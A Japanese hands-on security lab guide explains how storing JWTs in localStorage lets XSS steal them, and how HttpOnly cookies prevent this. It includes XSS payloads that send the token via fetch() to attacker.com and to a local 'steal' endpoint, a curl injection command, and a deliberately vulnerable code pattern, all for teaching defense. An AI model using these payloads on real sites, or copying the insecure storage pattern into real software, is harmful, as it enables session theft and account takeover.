# Web Storage Abuse — localStorage/sessionStorageへの機密データ保存

> JWTトークンやパスワードなどの機密データをlocalStorageに保存すると、XSSが1箇所でも存在すれば `localStorage.getItem()` で簡単に窃取されてしまう問題です。

---

## 対象ラボ

| 項目 | 内容 |
|------|------|
| **概要** | SPAがJWTアクセストークンをlocalStorageに保存しており、XSS経由でJavaScriptから直接トークンを読み取って外部に送信できる |
| **攻撃例** | `<img src=x onerror="fetch('http://attacker.com/?t='+localStorage.getItem('token'))">` をXSS経由で注入し、JWTトークンを窃取する |
| **技術スタック** | React + Hono API |
| **難易度** | ★★☆ 中級 |
| **前提知識** | XSSの理解（Step 2: XSS）、Web Storage API（localStorage / sessionStorage）、Cookie属性（HttpOnly, Secure）の基本 |

---

## この脆弱性を理解するための前提

### localStorage / sessionStorage / Cookie の違い

ブラウザにはクライアント側にデータを保存する仕組みが複数ある。SPAでの認証トークン管理を考える上で、それぞれの特性を理解することが重要。

| 特性 | localStorage | sessionStorage | Cookie |
|------|-------------|----------------|--------|
| **有効期間** | 明示的に削除するまで永続 | タブ/ウィンドウを閉じるまで | `Expires`/`Max-Age` で制御 |
| **スコープ** | 同一オリジン内の全タブ | 同一タブ内のみ | パス・ドメインで制御 |
| **容量** | 約5-10MB | 約5-10MB | 約4KB |
| **サーバーへの自動送信** | なし（手動で付与） | なし（手動で付与） | リクエストごとに自動送信 |
| **JavaScriptからのアクセス** | 常にアクセス可能 | 常にアクセス可能 | `HttpOnly` 属性で遮断可能 |

ここで最も重要な違いは最後の行。Cookie には `HttpOnly` 属性を設定すれば JavaScript からのアクセスを完全に遮断できるが、**Web Storage（localStorage / sessionStorage）には HttpOnly に相当する保護機構が存在しない**。Web Storage に保存されたデータは、同一オリジン上で実行されるすべての JavaScript から常に読み書き可能。

```typescript
// Web Storage — JavaScript から常にアクセス可能（保護する手段がない）
localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIs...");
const token = localStorage.getItem("token"); // いつでも読み取れる

// Cookie (HttpOnly) — JavaScript からアクセスできない
// Set-Cookie: session_id=abc123; HttpOnly
document.cookie; // → session_id は含まれない（ブラウザが除外する）
```

### SPAにおけるトークン管理パターン

SPA（Single Page Application）では、サーバーとの認証にJWTトークンを使うことが一般的。ログイン成功時にサーバーから受け取ったトークンをどこに保存するかが、セキュリティ上の重要な設計判断となる。

よく見られるパターンは以下の3つ:

1. **localStorage に保存** — 実装が簡単だが、XSSに対して無防備
2. **HttpOnly Cookie に保存** — XSSでトークンを直接読み取れないが、CSRF対策が必要
3. **メモリ（変数）に保存 + Refresh Token** — 最もセキュアだが実装が複雑

### どこに脆弱性が生まれるのか

開発者がSPAの認証トークンを localStorage に保存するパターンを選択した場合、アプリケーションのどこか1箇所にでもXSS脆弱性があると、トークンが即座に窃取される。

```typescript
// ⚠️ ログイン成功時にJWTをlocalStorageに保存 — XSSで読み取り可能
const LoginForm: React.FC = () => {
  const handleLogin = async (username: string, password: string) => {
    const res = await fetch("/api/labs/web-storage-abuse/vulnerable/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();

    // ⚠️ JWTトークンをlocalStorageに保存
    // XSSが存在すれば localStorage.getItem('token') で即座に窃取される
    localStorage.setItem("token", data.token);
  };

  // ...
};
```

```typescript
// ⚠️ APIリクエスト時にlocalStorageからトークンを取り出してヘッダーに付与
const fetchProfile = async () => {
  const token = localStorage.getItem("token");
  const res = await fetch("/api/labs/web-storage-abuse/vulnerable/profile", {
    headers: {
      Authorization: `Bearer ${token}`, // ⚠️ localStorageから読み取ったトークンを使用
    },
  });
  return res.json();
};
```

問題の本質は「localStorage にはアクセス制御の仕組みがない」こと。Cookie の `HttpOnly` のように「JavaScriptからは読めないが、HTTPリクエストには自動で付与される」という機構が Web Storage には存在しない。

---

## 攻撃の仕組み

![攻撃フロー](diagrams/web-storage-abuse-attack.svg)

### 攻撃のシナリオ

1. **被害者** がSPAにログインし、JWTトークンが localStorage に保存される

   ログインAPIがJWTを返し、フロントエンドがそれを `localStorage.setItem("token", jwt)` で保存する。この時点で、同一オリジン上で実行されるすべてのJavaScriptからトークンが読み取り可能になる。

   ```
   POST /api/labs/web-storage-abuse/vulnerable/login
   → 200 OK: { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }

   // フロントエンド
   localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...");
   ```

2. **攻撃者** がXSS脆弱性を利用して悪意のあるスクリプトを注入する

   Stored XSS（掲示板やプロフィール欄等）や Reflected XSS を利用して、被害者のブラウザ上でスクリプトを実行させる。Cookie と違い、localStorage はどんなスクリプトからでも読み取れるため、`HttpOnly` による保護は効かない。

   ```html
   <!-- 攻撃者がXSS脆弱性を利用して注入するペイロード -->
   <img src=x onerror="
     fetch('http://attacker.com/steal?token=' + localStorage.getItem('token'))
   ">
   ```

3. **被害者のブラウザ** がスクリプトを実行し、localStorage からトークンを読み取る

   `localStorage.getItem("token")` は同一オリジン上のスクリプトであれば無条件で成功する。Cookie の `HttpOnly` のようにブラウザがアクセスを遮断する仕組みがないため、XSSスクリプトはトークンの値をそのまま取得できる。

   ```javascript
   // 被害者のブラウザ上で実行される
   localStorage.getItem("token");
   // → "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.xxxxx"
   ```

4. **攻撃者のサーバー** がJWTトークンを受信し、被害者になりすます

   攻撃者は受信したJWTを `Authorization: Bearer` ヘッダーに設定してAPIにアクセスする。JWTは自己完結型のトークンであるため、サーバー側でセッションの無効化をしない限り、トークンの有効期限が切れるまで被害者として行動できる。

   ```bash
   # 攻撃者が窃取したJWTでAPIにアクセス
   curl http://target.com/api/profile \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
   # → { "username": "alice", "role": "admin", "email": "alice@example.com" }
   ```

### なぜ成功するのか

| 条件 | 説明 |
|------|------|
| トークンが localStorage に保存されている | Web Storage は JavaScript から常にアクセス可能であり、HttpOnly 相当の保護機構がない |
| XSS 脆弱性が1箇所でも存在する | 攻撃者が同一オリジン上で任意の JavaScript を実行できれば、localStorage の全データを読み取れる |
| JWTが自己完結型である | JWTはサーバー側に状態を持たないため、窃取されたトークンをサーバー側で即座に無効化することが難しい |

### 被害の範囲

- **機密性**: JWTトークンに含まれるユーザー情報（ユーザーID、ロール、メールアドレス等）が漏洩する。さらにトークンを使って被害者のすべてのAPIエンドポイントにアクセスでき、個人情報や機密データが取得される。localStorage に他の機密データ（APIキー、個人設定等）が保存されていれば、それらも一括で窃取される
- **完全性**: 攻撃者が被害者のトークンで認証済みのリクエストを送信し、プロフィールの変更、投稿の編集・削除、設定の変更が可能。管理者トークンが窃取された場合、システム全体の設定変更やユーザーデータの改ざんが行える
- **可用性**: JWTの有効期限が切れるまで攻撃者がアクセスを継続できる。サーバー側でトークンのブラックリスト管理をしていない場合、パスワードを変更しても既存のトークンは有効なまま残る

---

## 対策

![対策フロー](diagrams/web-storage-abuse-defense.svg)

### 根本原因

機密データ（認証トークン）を、JavaScript から無条件にアクセス可能な領域（localStorage）に保存していること。Web Storage API にはアクセス制御の仕組みが設計上存在せず、同一オリジン上のすべての JavaScript コードが読み書きできる。Cookie の `HttpOnly` 属性のように「HTTPリクエストには自動付与されるが、JavaScript からは読めない」という保護を提供する手段がない。

### 安全な実装

認証トークンを HttpOnly Cookie で管理することで、XSS が発生しても JavaScript からトークンを読み取れなくする。サーバーがログイン成功時にJWTを `Set-Cookie` ヘッダーで返し、ブラウザが自動的にリクエストに Cookie を付与する。

```typescript
// ✅ サーバー側: JWTをHttpOnly Cookieとして設定
// JavaScript の document.cookie や localStorage からはアクセスできない
import { setCookie } from "hono/cookie";

app.post("/login", async (c) => {
  const { username, password } = await c.req.json();
  const user = await authenticate(username, password);

  if (!user) {
    return c.json({ error: "Invalid credentials" }, 401);
  }

  const token = generateJWT(user);

  // ✅ HttpOnly Cookie でトークンを設定
  // ブラウザはリクエストごとに自動送信するが、JavaScript からは読み取れない
  setCookie(c, "token", token, {
    path: "/",
    httpOnly: true,    // JavaScript からアクセス不可
    secure: true,      // HTTPS 通信時のみ送信
    sameSite: "Strict", // クロスサイトリクエストで送信しない
    maxAge: 60 * 60,   // 1時間で期限切れ
  });

  // ✅ レスポンスボディにはトークンを含めない
  return c.json({ message: "Login successful", user: { username: user.username } });
});
```

```typescript
// ✅ サーバー側: Cookieからトークンを取得して検証
import { getCookie } from "hono/cookie";

app.get("/profile", async (c) => {
  // ✅ Cookie からトークンを取得（クライアントのJavaScriptは介在しない）
  const token = getCookie(c, "token");

  if (!token) {
    return c.json({ error: "Not authenticated" }, 401);
  }

  const payload = verifyJWT(token);
  return c.json({ username: payload.username, role: payload.role });
});
```

```tsx
// ✅ フロントエンド: トークンを一切扱わない
// Cookie はブラウザが自動送信するため、フロントエンドでトークンを管理する必要がない
const LoginForm: React.FC = () => {
  const handleLogin = async (username: string, password: string) => {
    const res = await fetch("/api/labs/web-storage-abuse/secure/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include", // ✅ Cookie を送受信するために必要
      body: JSON.stringify({ username, password }),
    });

    if (res.ok) {
      // ✅ トークンはHttpOnly Cookieに自動保存されている
      // localStorage には何も保存しない
      window.location.href = "/dashboard";
    }
  };

  // ...
};

// ✅ APIリクエスト時もトークンを手動で付与する必要がない
const fetchProfile = async () => {
  const res = await fetch("/api/labs/web-storage-abuse/secure/profile", {
    credentials: "include", // ✅ Cookie を自動送信
  });
  return res.json();
};
```

**なぜ安全か**: `HttpOnly` 属性が設定された Cookie は、ブラウザ内部の HTTP 通信層でのみ扱われ、JavaScript の `document.cookie` API からは完全に除外される。XSS が発生してもスクリプトはトークンの値を取得する手段がない。一方、ブラウザは通常通りリクエストごとに Cookie を自動送信するため、正常な認証フローには影響しない。

#### 脆弱 vs 安全: コード比較

**サーバー側（ログインレスポンス）**:

```diff
  app.post("/login", async (c) => {
    const user = await authenticate(username, password);
    const token = generateJWT(user);

-   // ⚠️ トークンをレスポンスボディで返す → フロントエンドがlocalStorageに保存する
-   return c.json({ token });
+   // ✅ トークンをHttpOnly Cookieとして設定 → JavaScriptからアクセス不可
+   setCookie(c, "token", token, {
+     path: "/",
+     httpOnly: true,
+     secure: true,
+     sameSite: "Strict",
+   });
+   return c.json({ message: "Login successful" });
  });
```

**フロントエンド側（トークン保存）**:

```diff
  const handleLogin = async (username: string, password: string) => {
    const res = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
+     credentials: "include",
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();

-   // ⚠️ localStorageに保存 → XSSで読み取り可能
-   localStorage.setItem("token", data.token);
+   // ✅ 何も保存しない — トークンはHttpOnly Cookieに自動保存済み
  };
```

**フロントエンド側（APIリクエスト）**:

```diff
  const fetchProfile = async () => {
-   // ⚠️ localStorageからトークンを読み取って手動で付与
-   const token = localStorage.getItem("token");
    const res = await fetch("/api/profile", {
-     headers: { Authorization: `Bearer ${token}` },
+     credentials: "include", // ✅ Cookieを自動送信
    });
    return res.json();
  };
```

脆弱なコードではトークンがJavaScriptの管理下に置かれ、XSSスクリプトが `localStorage.getItem("token")` でいつでも読み取れる。安全なコードではトークンがブラウザの Cookie ストアに `HttpOnly` で保存され、JavaScript から一切アクセスできない。

### その他の防御策

| 対策 | 種類 | 説明 |
|------|------|------|
| HttpOnly Cookie でトークンを管理 | 根本対策 | 認証トークンを HttpOnly Cookie に保存し、JavaScript からのアクセスを遮断する。最も重要かつ必須の対策 |
| XSS 対策（出力エスケープ、CSP） | 根本対策 | XSS そのものを防ぐことが最も効果的。HttpOnly Cookie であっても、XSS が存在すれば CSRF 的な攻撃や DOM 操作は可能なため、XSS 対策は常に必須 |
| In-memory storage + Refresh Token | 多層防御 | アクセストークンをJavaScript変数（メモリ）に保持し、ページリロード時は HttpOnly Cookie の Refresh Token で再取得する。localStorage を使わずにSPAの利便性を保てる |
| トークンの有効期限を短くする | 多層防御 | アクセストークンの有効期限を短く（5-15分）設定し、万が一窃取されても被害の時間窓を最小化する |
| CSP (Content Security Policy) | 多層防御 | `script-src` でインラインスクリプトや外部スクリプトの実行を制限し、XSS の影響を軽減する |
| トークンのブラックリスト管理 | 検知 | 窃取が検知された場合にサーバー側でトークンを無効化できる仕組みを用意する。JWTの場合はブラックリストまたはトークンバージョニングで対応する |

---

## ハンズオン手順

### Step 1: 脆弱バージョンで攻撃を体験

**ゴール**: localStorage に保存されたJWTトークンがXSSスクリプトから読み取れることを確認する

1. 開発サーバーを起動する

   ```bash
   cd backend && pnpm dev
   cd frontend && pnpm dev
   ```

2. ブラウザで脆弱バージョンのページにアクセスし、ログインする

   ```
   http://localhost:5173/labs/web-storage-abuse
   ```

   - テストユーザーでログイン（username: `alice`, password: `password123`）

3. DevTools で localStorage の中身を確認する

   - DevTools → Application → Local Storage → `http://localhost:5173`
   - `token` キーにJWTが保存されていることを確認する
   - Console タブで直接アクセスできることを確認する:

   ```javascript
   // DevTools Console で実行
   localStorage.getItem("token");
   // → "eyJhbGciOiJIUzI1NiIs..."  ← JWTがそのまま表示される
   ```

4. XSSペイロードを使ってトークンを窃取する

   ```bash
   # XSSを利用してlocalStorageからトークンを読み取り、外部に送信するペイロード
   curl -X POST http://localhost:3000/api/labs/web-storage-abuse/vulnerable/comment \
     -H "Content-Type: application/json" \
     -d '{"content": "<img src=x onerror=\"fetch('"'"'http://localhost:3001/steal?token='"'"'+localStorage.getItem('"'"'token'"'"'))\">"}'
   ```

5. 被害者としてコメント一覧を閲覧する

   - DevTools の Network タブで `http://localhost:3001/steal?token=eyJ...` へのリクエストを確認
   - JWTトークンが外部サーバーに送信されていることを確認する

6. 窃取したトークンでAPIにアクセスする

   ```bash
   # 攻撃者が窃取したJWTでプロフィールにアクセス
   curl http://localhost:3000/api/labs/web-storage-abuse/vulnerable/profile \
     -H "Authorization: Bearer <窃取したJWTトークン>"
   ```

   - 被害者のプロフィール情報が返される
   - **この結果が意味すること**: localStorage にトークンを保存する限り、XSSが1箇所でもあればトークンは必ず窃取される

### Step 2: 安全バージョンで防御を確認

**ゴール**: HttpOnly Cookie に保存されたトークンがXSSスクリプトから読み取れないことを確認する

1. 安全バージョンのフォームでログインする

   ```bash
   # ログイン — トークンはHttpOnly Cookieで返される
   curl -v -X POST http://localhost:3000/api/labs/web-storage-abuse/secure/login \
     -H "Content-Type: application/json" \
     -d '{"username": "alice", "password": "password123"}'
   ```

   - レスポンスヘッダーの `Set-Cookie` に `HttpOnly` 属性が含まれることを確認
   - レスポンスボディにトークンが含まれないことを確認

2. DevTools で Cookie と localStorage の違いを確認する

   - Application → Cookies: `token` Cookie に `HttpOnly` チェックが付いている
   - Application → Local Storage: トークンが保存されていない
   - Console で確認:

   ```javascript
   // DevTools Console で実行
   localStorage.getItem("token");  // → null（保存されていない）
   document.cookie;                 // → ""（HttpOnly Cookieは表示されない）
   ```

3. 同じXSSペイロードを試す

   ```bash
   curl -X POST http://localhost:3000/api/labs/web-storage-abuse/secure/comment \
     -H "Content-Type: application/json" \
     -d '{"content": "<img src=x onerror=\"fetch('"'"'http://localhost:3001/steal?token='"'"'+localStorage.getItem('"'"'token'"'"'))\">"}'
   ```

   - XSSが実行されても `localStorage.getItem("token")` は `null` を返す
   - 攻撃者のサーバーに送信されるのは `token=null` であり、有効なトークンは窃取されない

4. コードの差分を確認する

   - `backend/src/labs/step07-design/web-storage-abuse.ts` の脆弱版と安全版を比較
   - **トークンの保存場所の違い** に注目: レスポンスボディ vs HttpOnly Cookie

### 確認ポイント

以下を自分の言葉で説明できれば、このラボは完了です:

- [ ] localStorage / sessionStorage と Cookie (HttpOnly) のアクセス制御の違いは何か
- [ ] XSSが存在する場合、localStorage のデータと HttpOnly Cookie のデータで窃取リスクがどう異なるか
- [ ] HttpOnly Cookie でトークンを管理する場合、フロントエンドの実装はどう変わるか（`credentials: "include"` の役割）
- [ ] localStorage に保存して良いデータと保存すべきでないデータの判断基準は何か（機密性の有無）

---

## 実装メモ

| 項目 | パス |
|------|------|
| 脆弱エンドポイント | `/api/labs/web-storage-abuse/vulnerable/login`, `/api/labs/web-storage-abuse/vulnerable/profile`, `/api/labs/web-storage-abuse/vulnerable/comment` |
| 安全エンドポイント | `/api/labs/web-storage-abuse/secure/login`, `/api/labs/web-storage-abuse/secure/profile`, `/api/labs/web-storage-abuse/secure/comment` |
| バックエンド | `backend/src/labs/step07-design/web-storage-abuse.ts` |
| フロントエンド | `frontend/src/features/step07-design/pages/WebStorageAbuse.tsx` |

- 脆弱版: ログインAPIがJWTをレスポンスボディで返し、フロントエンドが `localStorage.setItem("token", data.token)` で保存する。APIリクエスト時は `Authorization: Bearer` ヘッダーにトークンを手動で付与する
- 安全版: ログインAPIがJWTを `Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict` で返し、フロントエンドはトークンを一切扱わない。APIリクエスト時は `credentials: "include"` を指定して Cookie を自動送信する
- XSSデモ: コメント投稿機能を用意し、脆弱版ではサニタイズなしで `dangerouslySetInnerHTML` で表示する。XSSペイロードで localStorage / Cookie それぞれの読み取り結果を比較する
- In-memory + Refresh Token パターンの発展例として、アクセストークンを React の state に保持し、リロード時に `/api/refresh` エンドポイント（HttpOnly Cookie の Refresh Token で認証）で再取得する実装も参考として示す

---

## 現実世界での事例

| 年 | インシデント | 概要 |
|----|-------------|------|
| 2017 | 複数のSPAフレームワークの認証チュートリアル | Auth0 や Firebase の初期チュートリアルが localStorage にトークンを保存するパターンを推奨しており、多くのSPAアプリケーションがこのパターンを採用した。その後、セキュリティ研究者からの指摘を受けて HttpOnly Cookie パターンへの移行が推奨されるようになった |
| 2019 | OAuth 2.0 for Browser-Based Apps (RFC) | IETFがブラウザベースアプリのセキュリティベストプラクティスを策定する中で、トークンを localStorage に保存しないことを明示的に推奨した。XSSによるトークン窃取リスクが公式に認知された |

---

## 関連ラボ

| ラボ | 関連性 |
|------|--------|
| [XSS (Stored / Reflected)](../step02-injection/xss.md) | Web Storage Abuse の起点となる脆弱性。XSS がなければ localStorage からのトークン窃取は発生しない。XSS 対策が最も重要な防御線 |
| [セッションハイジャック](../step04-session/session-hijacking.md) | Cookie にセッション ID を保存する場合でも HttpOnly 属性がなければ同様の窃取が可能。「トークンの保存場所」と「アクセス制御属性」の両方が重要 |
| [Cookie 操作](../step04-session/cookie-manipulation.md) | HttpOnly、Secure、SameSite 属性の詳細。安全なトークン管理には Cookie 属性の正しい設定が不可欠 |
| [JWT脆弱性](../step08-advanced/jwt-vulnerabilities.md) | JWT 自体のアルゴリズム混同や署名検証不備の問題。トークンの保存場所が安全でも、JWT の実装に脆弱性があれば攻撃は成立する |

---

## 参考資料

- [OWASP - HTML5 Security Cheat Sheet (Local Storage)](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [CWE-922: Insecure Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/922.html)
- [OWASP - JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [MDN - Web Storage API](https://developer.mozilla.org/ja/docs/Web/API/Web_Storage_API)
- [MDN - HttpOnly Cookie](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies#httponly_%E5%B1%9E%E6%80%A7)
- [Auth0 - Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
